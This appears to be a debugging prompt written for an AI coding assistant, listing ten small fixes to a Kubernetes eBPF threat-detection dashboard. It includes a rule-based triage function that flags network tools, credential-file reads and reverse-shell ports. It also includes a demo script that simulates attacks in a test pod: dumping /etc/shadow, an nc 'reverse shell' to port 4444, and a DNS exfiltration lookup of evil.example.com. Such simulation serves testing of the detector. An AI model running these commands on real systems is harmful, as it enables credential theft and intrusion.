# SENTINEL-CORE: SURGICAL DEBUG PROMPT
# Target: Gemini 2.5 Pro — Antigravity Planning Mode
# Scope: dashboard_api.py + orchestrator.py + App.jsx + ml_triage fallback
# Constraint: Minimal changes only. Demo in 90 minutes. Do NOT refactor.

---

## MISSION

Fix exactly the issues listed below. Touch ONLY the broken lines.
Do not reorganize, rename, or rewrite anything that works.
Return each fix as: FILENAME → LINE NUMBER → OLD CODE → NEW CODE.

---

## FIX 1 — dashboard_api.py: Missing `import os` (CRASHES /api/cluster)

File: `dashboard_api.py`
Insert at line 1 (very top, before any other import):
```python
import os
```
This is the only fix needed for the frontend ↔ backend connection crash.

---

## FIX 2 — dashboard_api.py: Port conflict with sentinel API

Current: `FORWARDER_API_URL = os.getenv("FORWARDER_API_URL", "http://localhost:8081")`
Dashboard API runs on 8080. Sentinel/forwarder API runs on 8081.
These are DIFFERENT services — this line is CORRECT as-is.

The real issue: `start_app.sh` must start BOTH services:
- `forwarder/api.py` on port 8081 (sentinel pipeline API)
- `dashboard_api.py` on port 8080 (dashboard backend)

Check `start_app.sh` — if it only starts one, add:
```bash
# Start dashboard API on port 8080
python3 dashboard_api.py &
DASHBOARD_PID=$!
echo "📊 Dashboard API: http://127.0.0.1:8080"
```
Add this AFTER the line that starts the forwarder/sentinel API.

---

## FIX 3 — dashboard_api.py: Wrong FastAPI lifespan registration

Current (broken):
```python
app.router.lifespan_context = lifespan
```
This is the old FastAPI pattern and causes the background tasks to never start.

Replace with correct pattern — change the `app = FastAPI(...)` block to:
```python
app = FastAPI(
    title="Sentinel-Core Dashboard API",
    description="Dashboard backend — reads live eBPF events from Redis stream + remediation agent.",
    version="2.0.0",
    lifespan=lifespan,
)
```
And DELETE the line `app.router.lifespan_context = lifespan` entirely.

---

## FIX 4 — orchestrator.py: Wrong default LLM model (quota exhausted)

Current:
```python
LLM_MODEL = os.getenv("LLM_MODEL", "gemini-2.5-pro")
```
Replace with:
```python
LLM_MODEL = os.getenv("LLM_MODEL", "gemini-2.5-flash")
```
Also update `.env`:
```
LLM_MODEL=gemini-2.5-flash
```

---

## FIX 5 — orchestrator.py: Embedding model mismatch crashes Pinecone queries

Current: orchestrator uses `sentence-transformers/all-mpnet-base-v2` (HuggingFace, 768-dim)
BUT: ingest.py embedded into Pinecone using Google `models/text-embedding-004` (768-dim)

Same dimension but DIFFERENT vector spaces = wrong/garbage RAG results.

Fix: Replace HuggingFace embeddings in orchestrator.py with Google embeddings.

Find the HuggingFace initialization block:
```python
from langchain_huggingface import HuggingFaceEmbeddings
_embeddings_model = HuggingFaceEmbeddings(model_name=EMBEDDING_MODEL_NAME)
```

Replace with:
```python
from langchain_google_genai import GoogleGenerativeAIEmbeddings
_embeddings_model = GoogleGenerativeAIEmbeddings(
    model="models/text-embedding-004",
    google_api_key=GOOGLE_API_KEY
)
```

Also remove the line:
```python
EMBEDDING_MODEL_NAME = "sentence-transformers/all-mpnet-base-v2"
```

And in Node B (rag_retriever), the embedding calls already use:
```python
m_vec = _embeddings_model.embed_query(mitre_query)
a_vec = _embeddings_model.embed_query(azure_query)
```
These stay EXACTLY the same — just the model changes.

---

## FIX 6 — ml_triage fallback: ALL attacks graded FP (RAG never triggers)

File: `forwarder/ml_triage.py` (find the ML inference exception handler)

The XGBoost model expects GUIDE dataset features (DetectorId, AlertTitle etc.)
but receives Tetragon features (uid, pid, binary_risk etc.) — causing total failure.

Find the except block that currently returns FP on ML failure:
```python
except Exception as e:
    logger.error(f"ML Inference failed: {e}")
    return "FP", 0.0   # ← THIS LINE
```

Replace ONLY that return line with a call to this new function.
Add this function ABOVE the inference function:

```python
def rule_based_triage(event: dict) -> tuple:
    """
    Rule-based fallback when ML model fails.
    Used when GUIDE model features don't match Tetragon features.
    """
    binary = event.get("binary", event.get("process", "")).lower()
    binary_name = binary.rsplit("/", 1)[-1] if binary else ""
    path_args = " ".join([
        str(event.get("file_path", "")),
        str(event.get("path", "")),
        str(event.get("args", "")),
    ]).lower()
    uid = event.get("uid", 1000)
    namespace = event.get("namespace", "default")

    # HIGH CONFIDENCE TRUE POSITIVES
    if binary_name in ("curl", "wget"):
        return "TP", 0.95
    if binary_name in ("nc", "ncat", "netcat"):
        return "TP", 0.97
    if binary_name in ("nmap", "nslookup", "dig") and namespace not in ("kube-system", "monitoring"):
        return "TP", 0.90
    if any(p in path_args for p in ("/etc/shadow", "/etc/passwd", "/root/.ssh", "/proc/sysrq")):
        return "TP", 0.98
    if any(p in path_args for p in ("4444", "1337", "reverse", "revshell")):
        return "TP", 0.96

    # BENIGN POSITIVES (suspicious but authorized)
    if binary_name in ("ps", "top", "htop", "netstat", "ss"):
        return "BP", 0.70
    if binary_name in ("id", "whoami", "uname") and uid == 0:
        return "BP", 0.65
    if uid == 0 and namespace not in ("kube-system", "monitoring", "cert-manager"):
        return "BP", 0.60

    # DEFAULT: FALSE POSITIVE
    return "FP", 0.85
```

Then change the failing return to:
```python
    return rule_based_triage(event)
```

---

## FIX 7 — App.jsx: overflow-hidden blocks ALL scrolling

This is the root cause of broken UI / no scroll on any page.

Current root div:
```jsx
<div className="flex h-screen w-full bg-background text-foreground overflow-hidden font-sans">
```

The `overflow-hidden` here traps all scroll. The inner page containers also have
`flex-1 overflow-hidden` which compounds the problem.

Fix the root div — change `overflow-hidden` to `overflow-hidden` stays on root
but add `overflow-y-auto` to the INNER page wrapper:

Find:
```jsx
<div className="flex-1 flex flex-col overflow-hidden">
  <Header />
  <AnimatePresence mode="wait">
    {renderPage()}
  </AnimatePresence>
  <SyscallTicker />
</div>
```

Change the renderPage motion.div wrappers from `overflow-hidden` to `overflow-y-auto`:
```jsx
case 'command':
  return (
    <motion.div key="command" variants={pageVariants} initial="initial"
      animate="animate" exit="exit"
      className="flex-1 overflow-y-auto">   {/* WAS: overflow-hidden */}
      <CommandCenter />
    </motion.div>
  )
case 'ledger':
  return (
    <motion.div key="ledger" variants={pageVariants} initial="initial"
      animate="animate" exit="exit"
      className="flex-1 overflow-y-auto">   {/* WAS: overflow-hidden */}
      <IncidentLedger />
    </motion.div>
  )
case 'forensics':
  return (
    <motion.div key="forensics" variants={pageVariants} initial="initial"
      animate="animate" exit="exit"
      className="flex-1 overflow-y-auto">   {/* WAS: overflow-hidden */}
      <ForensicsPanel />
    </motion.div>
  )
```

---

## FIX 8 — App.jsx: WebSocket connects to wrong port on non-localhost

Current:
```jsx
const WS_URL = `ws://${window.location.hostname}:8080/api/ws/events`
```
This is correct — keep it. But add a reconnection indicator so demo shows
connection status clearly. After the `setWsConnected(false)` line in ws.onclose:
```jsx
ws.onclose = () => {
  setWsConnected(false)
  console.log('[WS] Disconnected. Reconnecting in 3s...')
  reconnectTimeout.current = setTimeout(connectWs, 3000)
}
```
No change needed — just confirming this is fine.

---

## FIX 9 — Add 5 DEMO ATTACK SCRIPTS that produce TRUE POSITIVE events

Create a new file: `demo_attacks.sh`

```bash
#!/bin/bash
# Sentinel-Core Demo Attack Script
# Runs 5 real attacks inside the Kind cluster that WILL trigger TP classification
# Run AFTER ./start_app.sh

POD="attacker-pod"
NS="default"

echo "============================================================"
echo "  SENTINEL-CORE DEMO ATTACKS — ALL SHOULD GRADE AS TP"
echo "============================================================"

echo ""
echo "⚔️  Attack 1: External C2 payload download (T1071.001)"
kubectl exec -n $NS $POD -- curl -s http://httpbin.org/get -o /dev/null
echo "   → Expected: TP | curl | connect syscall"

sleep 2

echo ""
echo "⚔️  Attack 2: /etc/shadow credential dump (T1003.008)"
kubectl exec -n $NS $POD -- cat /etc/shadow
echo "   → Expected: TP | cat | openat on /etc/shadow"

sleep 2

echo ""
echo "⚔️  Attack 3: Reverse shell attempt via nc (T1059.004)"
kubectl exec -n $NS $POD -- sh -c "nc -w1 10.0.0.99 4444 </dev/null" || true
echo "   → Expected: TP | nc | connect to 10.0.0.99:4444"

sleep 2

echo ""
echo "⚔️  Attack 4: Wget malware download (T1105)"
kubectl exec -n $NS $POD -- wget -q http://httpbin.org/get -O /tmp/payload || true
echo "   → Expected: TP | wget | connect syscall"

sleep 2

echo ""
echo "⚔️  Attack 5: DNS exfiltration attempt (T1048.003)"
kubectl exec -n $NS $POD -- nslookup evil.example.com || true
echo "   → Expected: TP | nslookup | connect UDP:53"

echo ""
echo "============================================================"
echo "  All 5 attacks executed."
echo "  Check dashboard at http://localhost:3000"
echo "  Check API at http://localhost:8081/sentinel/analyze"
echo "============================================================"
```

Make it executable: `chmod +x demo_attacks.sh`

---

## FIX 10 — .env: Add missing DASHBOARD_API_PORT

Add to `.env`:
```
DASHBOARD_API_PORT=8080
FORWARDER_API_URL=http://localhost:8081
```

---

## VERIFICATION AFTER ALL FIXES

Run these checks in order:

```bash
# 1. Syntax check all Python files
python3 -c "import ast; ast.parse(open('dashboard_api.py').read()); print('dashboard_api.py OK')"
python3 -c "import ast; ast.parse(open('orchestrator.py').read()); print('orchestrator.py OK')"

# 2. No deprecated SDK
grep -n "google.generativeai" orchestrator.py dashboard_api.py && echo "FAIL" || echo "PASS"

# 3. No PINECONE_ENV
grep -n "PINECONE_ENV" orchestrator.py && echo "FAIL" || echo "PASS"

# 4. No gemini-2.5-pro hardcoded
grep -n "gemini-2.5-pro" orchestrator.py && echo "FAIL" || echo "PASS"

# 5. Start everything
./start_app.sh

# 6. In new terminal, run demo attacks
./demo_attacks.sh

# 7. Verify TP events appear
curl -s http://localhost:8081/api/events | python3 -m json.tool | grep '"grade"'
```

---

## EXPECTED TERMINAL OUTPUT AFTER FIXES

```
[NODE A] event_router    | grade=TP  | score=0.95 | 2ms
[NODE B] rag_retriever   | mitre=5278 chars | azure=1423 chars | 340ms
[NODE C] report_generator| report=180 words | yaml=23 lines | 2100ms
------------------------------------------------------------
THREAT NEUTRALIZED
  Process  : curl
  Grade    : TP (95.0% confidence)
  MITRE    : T1071.001
  YAML Fix : NetworkPolicy applied
```

Dashboard at `http://localhost:3000` must show:
- Scrollable IncidentLedger with real TP events
- ForensicsPanel with MITRE technique cards
- Immunity score updating live
- No broken layout / no overflow issues

---

## RULES

1. Minimal changes. Touch only broken lines.
2. No renaming, no refactoring.
3. Return fixes as labeled code blocks with filename + line numbers.
4. Do not truncate any file.
5. If a fix requires seeing more of a file, ask for it — do not guess.
